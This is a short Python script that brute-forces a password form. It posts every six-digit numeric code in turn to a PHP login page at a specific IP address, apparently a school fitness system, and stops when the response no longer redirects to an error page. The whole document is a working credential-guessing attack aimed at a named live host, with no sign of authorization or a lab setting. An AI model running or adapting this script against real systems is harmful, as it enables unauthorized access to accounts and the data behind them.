import requests
import os

r = requests.get('http://220.133.202.121/pths/fitness/convener.php')
res = "0"

for id in range(1000000):
	passwd = str(id).zfill(6)+'\n'
	playload = {"password":str(passwd)}
	resp = requests.post("http://220.133.202.121/pths/fitness/convener.php", playload)
	res = resp.url
	#print(res)
	print("testing " + str(passwd))
	if res != "http://220.133.202.121/pths/fitness/error.php":
		print("finding " + str(passwd))
		break

